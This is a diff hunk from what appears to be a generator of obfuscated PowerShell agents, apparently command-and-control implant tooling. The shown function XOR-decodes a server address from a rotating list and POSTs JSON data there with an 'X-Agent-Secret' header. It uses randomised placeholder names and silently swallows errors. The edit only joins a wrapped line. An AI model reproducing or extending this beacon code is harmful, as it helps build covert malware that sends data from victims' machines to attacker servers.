@@ -5342,8 +5342,7 @@ function ${fnPost} {
     $ep = ${fnXorDec} $${vUrls}[$${vIdx} % $${vUrls}.Count] $${vKey}
     $ep = $ep.TrimEnd('/') + (${fnXorDec} $${vMethod} $${vKey})
     try {
-        $${vResp} = Invoke-RestMethod -Uri $ep -Method POST -Body ($${vBody} | ConvertTo-Json -Compress) `
-            -ContentType 'application/json' -Headers @{'X-Agent-Secret'=$${vSecret}} -UseBasicParsing
+        $${vResp} = Invoke-RestMethod -Uri $ep -Method POST -Body ($${vBody} | ConvertTo-Json -Compress) -ContentType 'application/json' -Headers @{'X-Agent-Secret'=$${vSecret}} -UseBasicParsing
         return $${vResp}
     } catch { return $null }
 }
